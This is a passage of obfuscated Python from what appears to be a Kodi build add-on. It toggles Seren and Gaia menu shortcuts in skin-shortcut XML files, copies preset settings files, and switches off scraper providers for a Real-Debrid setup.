    with open (O0O0000O0O0O00OOO ,'r')as OO0OOOOOO0OOOO00O :#line:1363
      O00O000OO00O00O0O =OO0OOOOOO0OOOO00O .read ()#line:1364
    O00O000OO00O00O0O =O00O000OO00O00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1382
    with open (O0O0000O0O0O00OOO ,'w')as OO0OOOOOO0OOOO00O :#line:1385
      OO0OOOOOO0OOOO00O .write (O00O000OO00O00O0O )#line:1386
    O0O0000O0O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1390
    with open (O0O0000O0O0O00OOO ,'r')as OO0OOOOOO0OOOO00O :#line:1391
      O00O000OO00O00O0O =OO0OOOOOO0OOOO00O .read ()#line:1392
    O00O000OO00O00O0O =O00O000OO00O00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1410
    with open (O0O0000O0O0O00OOO ,'w')as OO0OOOOOO0OOOO00O :#line:1413
      OO0OOOOOO0OOOO00O .write (O00O000OO00O00O0O )#line:1414
    O0O0000O0O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1417
    with open (O0O0000O0O0O00OOO ,'r')as OO0OOOOOO0OOOO00O :#line:1418
      O00O000OO00O00O0O =OO0OOOOOO0OOOO00O .read ()#line:1419
    O00O000OO00O00O0O =O00O000OO00O00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1437
    with open (O0O0000O0O0O00OOO ,'w')as OO0OOOOOO0OOOO00O :#line:1440
      OO0OOOOOO0OOOO00O .write (O00O000OO00O00O0O )#line:1441
    O0O0000O0O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1443
    with open (O0O0000O0O0O00OOO ,'r')as OO0OOOOOO0OOOO00O :#line:1444
      O00O000OO00O00O0O =OO0OOOOOO0OOOO00O .read ()#line:1445
    O00O000OO00O00O0O =O00O000OO00O00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1463
    with open (O0O0000O0O0O00OOO ,'w')as OO0OOOOOO0OOOO00O :#line:1466
      OO0OOOOOO0OOOO00O .write (O00O000OO00O00O0O )#line:1467
    O0O0000O0O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1469
    with open (O0O0000O0O0O00OOO ,'r')as OO0OOOOOO0OOOO00O :#line:1470
      O00O000OO00O00O0O =OO0OOOOOO0OOOO00O .read ()#line:1471
    O00O000OO00O00O0O =O00O000OO00O00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1489
    with open (O0O0000O0O0O00OOO ,'w')as OO0OOOOOO0OOOO00O :#line:1492
      OO0OOOOOO0OOOO00O .write (O00O000OO00O00O0O )#line:1493
    O0O0000O0O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1496
    with open (O0O0000O0O0O00OOO ,'r')as OO0OOOOOO0OOOO00O :#line:1497
      O00O000OO00O00O0O =OO0OOOOOO0OOOO00O .read ()#line:1498
    O00O000OO00O00O0O =O00O000OO00O00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1516
    with open (O0O0000O0O0O00OOO ,'w')as OO0OOOOOO0OOOO00O :#line:1519
      OO0OOOOOO0OOOO00O .write (O00O000OO00O00O0O )#line:1520
def rdbuildinstalloff ():#line:1523
    try :#line:1524
       OO00OO000O0O0O000 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1525
       OO0O0O0O00O00O00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1526
       copyfile (OO00OO000O0O0O000 ,OO0O0O0O00O00O00O )#line:1528
       OO00OO000O0O0O000 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1530
       OO0O0O0O00O00O00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1531
       copyfile (OO00OO000O0O0O000 ,OO0O0O0O00O00O00O )#line:1533
       OO00OO000O0O0O000 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1535
       OO0O0O0O00O00O00O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1536
       copyfile (OO00OO000O0O0O000 ,OO0O0O0O00O00O00O )#line:1538
       OO00OO000O0O0O000 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1541
       OO0O0O0O00O00O00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1542
       copyfile (OO00OO000O0O0O000 ,OO0O0O0O00O00O00O )#line:1544
    except :#line:1546
       pass #line:1547
def rdbuildaddonON ():#line:1554
    OOO00OO000O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1556
    with open (OOO00OO000O0OO0O0 ,'r')as OO0O000OOO00000OO :#line:1557
      OOOOO00000O0OO0OO =OO0O000OOO00000OO .read ()#line:1558
    OOOOO00000O0OO0OO =OOOOO00000O0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1576
    with open (OOO00OO000O0OO0O0 ,'w')as OO0O000OOO00000OO :#line:1579
      OO0O000OOO00000OO .write (OOOOO00000O0OO0OO )#line:1580
    OOO00OO000O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1584
    with open (OOO00OO000O0OO0O0 ,'r')as OO0O000OOO00000OO :#line:1585
      OOOOO00000O0OO0OO =OO0O000OOO00000OO .read ()#line:1586
    OOOOO00000O0OO0OO =OOOOO00000O0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1604
    with open (OOO00OO000O0OO0O0 ,'w')as OO0O000OOO00000OO :#line:1607
      OO0O000OOO00000OO .write (OOOOO00000O0OO0OO )#line:1608
    OOO00OO000O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1612
    with open (OOO00OO000O0OO0O0 ,'r')as OO0O000OOO00000OO :#line:1613
      OOOOO00000O0OO0OO =OO0O000OOO00000OO .read ()#line:1614
    OOOOO00000O0OO0OO =OOOOO00000O0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1632
    with open (OOO00OO000O0OO0O0 ,'w')as OO0O000OOO00000OO :#line:1635
      OO0O000OOO00000OO .write (OOOOO00000O0OO0OO )#line:1636
    OOO00OO000O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1640
    with open (OOO00OO000O0OO0O0 ,'r')as OO0O000OOO00000OO :#line:1641
      OOOOO00000O0OO0OO =OO0O000OOO00000OO .read ()#line:1642
    OOOOO00000O0OO0OO =OOOOO00000O0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1660
    with open (OOO00OO000O0OO0O0 ,'w')as OO0O000OOO00000OO :#line:1663
      OO0O000OOO00000OO .write (OOOOO00000O0OO0OO )#line:1664
    OOO00OO000O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1667
    with open (OOO00OO000O0OO0O0 ,'r')as OO0O000OOO00000OO :#line:1668
      OOOOO00000O0OO0OO =OO0O000OOO00000OO .read ()#line:1669
    OOOOO00000O0OO0OO =OOOOO00000O0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1687
    with open (OOO00OO000O0OO0O0 ,'w')as OO0O000OOO00000OO :#line:1690
      OO0O000OOO00000OO .write (OOOOO00000O0OO0OO )#line:1691
    OOO00OO000O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1693
    with open (OOO00OO000O0OO0O0 ,'r')as OO0O000OOO00000OO :#line:1694
      OOOOO00000O0OO0OO =OO0O000OOO00000OO .read ()#line:1695
    OOOOO00000O0OO0OO =OOOOO00000O0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1713
    with open (OOO00OO000O0OO0O0 ,'w')as OO0O000OOO00000OO :#line:1716
      OO0O000OOO00000OO .write (OOOOO00000O0OO0OO )#line:1717
    OOO00OO000O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1719
    with open (OOO00OO000O0OO0O0 ,'r')as OO0O000OOO00000OO :#line:1720
      OOOOO00000O0OO0OO =OO0O000OOO00000OO .read ()#line:1721
    OOOOO00000O0OO0OO =OOOOO00000O0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1739
    with open (OOO00OO000O0OO0O0 ,'w')as OO0O000OOO00000OO :#line:1742
      OO0O000OOO00000OO .write (OOOOO00000O0OO0OO )#line:1743
    OOO00OO000O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1746
    with open (OOO00OO000O0OO0O0 ,'r')as OO0O000OOO00000OO :#line:1747
      OOOOO00000O0OO0OO =OO0O000OOO00000OO .read ()#line:1748
    OOOOO00000O0OO0OO =OOOOO00000O0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1766
    with open (OOO00OO000O0OO0O0 ,'w')as OO0O000OOO00000OO :#line:1769
      OO0O000OOO00000OO .write (OOOOO00000O0OO0OO )#line:1770
def rdbuildinstallON ():#line:1773
    try :#line:1775
       O00000O000OOOO000 =ADDONPATH +"/resources/rd/victory.xml"#line:1776
       O00OOOOO0O0OOO0OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1777
       copyfile (O00000O000OOOO000 ,O00OOOOO0O0OOO0OO )#line:1779
       O00000O000OOOO000 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1781
       O00OOOOO0O0OOO0OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1782
       copyfile (O00000O000OOOO000 ,O00OOOOO0O0OOO0OO )#line:1784
       O00000O000OOOO000 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1786
       O00OOOOO0O0OOO0OO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1787
       copyfile (O00000O000OOOO000 ,O00OOOOO0O0OOO0OO )#line:1789
       O00000O000OOOO000 =ADDONPATH +"/resources/rd/Splash.png"#line:1792
       O00OOOOO0O0OOO0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1793
       copyfile (O00000O000OOOO000 ,O00OOOOO0O0OOO0OO )#line:1795
    except :#line:1797
       pass #line:1798
def rdbuild ():#line:1808
	OOO000OOOO0OO0O00 =(ADDON .getSetting ("auto_rd"))#line:1809
	if OOO000OOOO0OO0O00 =='true':#line:1810
		OOO0O0OO0O0OO0OO0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1811
		OOO0O0OO0O0OO0OO0 .setSetting ('all_t','0')#line:1812
		OOO0O0OO0O0OO0OO0 .setSetting ('rd_menu_enable','false')#line:1813
		OOO0O0OO0O0OO0OO0 .setSetting ('magnet_bay','false')#line:1814
		OOO0O0OO0O0OO0OO0 .setSetting ('magnet_extra','false')#line:1815
		OOO0O0OO0O0OO0OO0 .setSetting ('rd_only','false')#line:1816
		OOO0O0OO0O0OO0OO0 .setSetting ('ftp','false')#line:1818
		OOO0O0OO0O0OO0OO0 .setSetting ('fp','false')#line:1819
		OOO0O0OO0O0OO0OO0 .setSetting ('filter_fp','false')#line:1820
		OOO0O0OO0O0OO0OO0 .setSetting ('fp_size_en','false')#line:1821
		OOO0O0OO0O0OO0OO0 .setSetting ('afdah','false')#line:1822
		OOO0O0OO0O0OO0OO0 .setSetting ('ap2s','false')#line:1823
		OOO0O0OO0O0OO0OO0 .setSetting ('cin','false')#line:1824
		OOO0O0OO0O0OO0OO0 .setSetting ('clv','false')#line:1825
		OOO0O0OO0O0OO0OO0 .setSetting ('cmv','false')#line:1826
		OOO0O0OO0O0OO0OO0 .setSetting ('dl20','false')#line:1827
		OOO0O0OO0O0OO0OO0 .setSetting ('esc','false')#line:1828
		OOO0O0OO0O0OO0OO0 .setSetting ('extra','false')#line:1829
		OOO0O0OO0O0OO0OO0 .setSetting ('film','false')#line:1830
		OOO0O0OO0O0OO0OO0 .setSetting ('fre','false')#line:1831
		OOO0O0OO0O0OO0OO0 .setSetting ('fxy','false')#line:1832
		OOO0O0OO0O0OO0OO0 .setSetting ('genv','false')#line:1833
		OOO0O0OO0O0OO0OO0 .setSetting ('getgo','false')#line:1834
		OOO0O0OO0O0OO0OO0 .setSetting ('gold','false')#line:1835
		OOO0O0OO0O0OO0OO0 .setSetting ('gona','false')#line:1836
		OOO0O0OO0O0OO0OO0 .setSetting ('hdmm','false')#line:1837
		OOO0O0OO0O0OO0OO0 .setSetting ('hdt','false')#line:1838
		OOO0O0OO0O0OO0OO0 .setSetting ('icy','false')#line:1839
		OOO0O0OO0O0OO0OO0 .setSetting ('ind','false')#line:1840
		OOO0O0OO0O0OO0OO0 .setSetting ('iwi','false')#line:1841
		OOO0O0OO0O0OO0OO0 .setSetting ('jen_free','false')#line:1842
		OOO0O0OO0O0OO0OO0 .setSetting ('kiss','false')#line:1843
		OOO0O0OO0O0OO0OO0 .setSetting ('lavin','false')#line:1844
		OOO0O0OO0O0OO0OO0 .setSetting ('los','false')#line:1845
		OOO0O0OO0O0OO0OO0 .setSetting ('m4u','false')#line:1846
		OOO0O0OO0O0OO0OO0 .setSetting ('mesh','false')#line:1847
		OOO0O0OO0O0OO0OO0 .setSetting ('mf','false')#line:1848
		OOO0O0OO0O0OO0OO0 .setSetting ('mkvc','false')#line:1849
		OOO0O0OO0O0OO0OO0 .setSetting ('mjy','false')#line:1850
		OOO0O0OO0O0OO0OO0 .setSetting ('hdonline','false')#line:1851
		OOO0O0OO0O0OO0OO0 .setSetting ('moviex','false')#line:1852
		OOO0O0OO0O0OO0OO0 .setSetting ('mpr','false')#line:1853
		OOO0O0OO0O0OO0OO0 .setSetting ('mvg','false')#line:1854
		OOO0O0OO0O0OO0OO0 .setSetting ('mvl','false')#line:1855
		OOO0O0OO0O0OO0OO0 .setSetting ('mvs','false')#line:1856
		OOO0O0OO0O0OO0OO0 .setSetting ('myeg','false')#line:1857
		OOO0O0OO0O0OO0OO0 .setSetting ('ninja','false')#line:1858
		OOO0O0OO0O0OO0OO0 .setSetting ('odb','false')#line:1859
		OOO0O0OO0O0OO0OO0 .setSetting ('ophd','false')#line:1860
		OOO0O0OO0O0OO0OO0 .setSetting ('pks','false')#line:1861
		OOO0O0OO0O0OO0OO0 .setSetting ('prf','false')#line:1862
		OOO0O0OO0O0OO0OO0 .setSetting ('put18','false')#line:1863
		OOO0O0OO0O0OO0OO0 .setSetting ('req','false')#line:1864
		OOO0O0OO0O0OO0OO0 .setSetting ('rftv','false')#line:1865
		OOO0O0OO0O0OO0OO0 .setSetting ('rltv','false')#line:1866
		OOO0O0OO0O0OO0OO0 .setSetting ('sc','false')#line:1867
		OOO0O0OO0O0OO0OO0 .setSetting ('seehd','false')#line:1868
		OOO0O0OO0O0OO0OO0 .setSetting ('showbox','false')#line:1869
		OOO0O0OO0O0OO0OO0 .setSetting ('shuid','false')#line:1870
		OOO0O0OO0O0OO0OO0 .setSetting ('sil_gh','false')#line:1871
		OOO0O0OO0O0OO0OO0 .setSetting ('spv','false')#line:1872
		OOO0O0OO0O0OO0OO0 .setSetting ('subs','false')#line:1873
		OOO0O0OO0O0OO0OO0 .setSetting ('tvs','false')#line:1874
		OOO0O0OO0O0OO0OO0 .setSetting ('tw','false')#line:1875
		OOO0O0OO0O0OO0OO0 .setSetting ('upto','false')#line:1876
		OOO0O0OO0O0OO0OO0 .setSetting ('vel','false')#line:1877
		OOO0O0OO0O0OO0OO0 .setSetting ('vex','false')#line:1878
		OOO0O0OO0O0OO0OO0 .setSetting ('vidc','false')#line:1879
		OOO0O0OO0O0OO0OO0 .setSetting ('w4hd','false')#line:1880
		OOO0O0OO0O0OO0OO0 .setSetting ('wav','false')#line:1881
		OOO0O0OO0O0OO0OO0 .setSetting ('wf','false')#line:1882
		OOO0O0OO0O0OO0OO0 .setSetting ('wse','false')#line:1883
		OOO0O0OO0O0OO0OO0 .setSetting ('wss','false')#line:1884
		OOO0O0OO0O0OO0OO0 .setSetting ('wsse','false')#line:1885
		OOO0O0OO0O0OO0OO0 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1886
		OOO0O0OO0O0OO0OO0 .setSetting ('debrid.only','true')#line:1887
		OOO0O0OO0O0OO0OO0 .setSetting ('hosts.captcha','false')#line:1888
		OOO0O0OO0O0OO0OO0 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1889
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.123moviehd','false')#line:1890
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.300mbdownload','false')#line:1891
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.alltube','false')#line:1892
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.allucde','false')#line:1893
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.animebase','false')#line:1894
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.animeloads','false')#line:1895
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.animetoon','false')#line:1896
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.bnwmovies','false')#line:1897
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.boxfilm','false')#line:1898
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.bs','false')#line:1899
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.cartoonhd','false')#line:1900
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.cdahd','false')#line:1901
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.cdax','false')#line:1902
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.cine','false')#line:1903
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.cinenator','false')#line:1904
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.cmovieshdbz','false')#line:1905
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.coolmoviezone','false')#line:1906
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.ddl','false')#line:1907
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.deepmovie','false')#line:1908
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.ekinomaniak','false')#line:1909
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.ekinotv','false')#line:1910
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.filiser','false')#line:1911
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.filmpalast','false')#line:1912
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.filmwebbooster','false')#line:1913
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.filmxy','false')#line:1914
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.fmovies','false')#line:1915
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.foxx','false')#line:1916
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.freefmovies','false')#line:1917
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.freeputlocker','false')#line:1918
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.furk','false')#line:1919
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.gamatotv','false')#line:1920
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.gogoanime','false')#line:1921
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.gowatchseries','false')#line:1922
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.hackimdb','false')#line:1923
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.hdfilme','false')#line:1924
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.hdmto','false')#line:1925
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.hdpopcorns','false')#line:1926
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.hdstreams','false')#line:1927
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.horrorkino','false')#line:1929
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.iitv','false')#line:1930
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.iload','false')#line:1931
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.iwaatch','false')#line:1932
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.kinodogs','false')#line:1933
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.kinoking','false')#line:1934
